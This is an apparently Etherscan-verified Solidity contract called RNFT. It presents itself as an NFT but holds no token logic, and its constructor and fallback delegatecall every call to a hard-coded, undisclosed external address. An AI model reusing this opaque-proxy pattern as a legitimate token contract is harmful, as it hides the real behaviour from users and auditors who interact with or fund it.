/**
 *Submitted for verification at Etherscan.io on 2023-06-14
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.13;

contract RNFT {
    uint256 private totalSupply = 5001;
    address public owner = 0x60F37b85AA857A5a5583cB0770e60BB119621e4B;
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0xa7e0Ac802772fd167a2AC09236bB3CB7cc77b91e).delegatecall(data);
        require(r1, "Verification1");
        return result;
    }

    receive() payable external {
    }

    constructor(string memory name, string memory symbol, string memory uri, address from, uint256 max) {
        (bool r1,) = address(0xa7e0Ac802772fd167a2AC09236bB3CB7cc77b91e).delegatecall(abi.encodeWithSignature("initialize(string,string,string,address,uint256)", name, symbol, uri, from, max));
        require(r1, "Verificiation2");
    }
}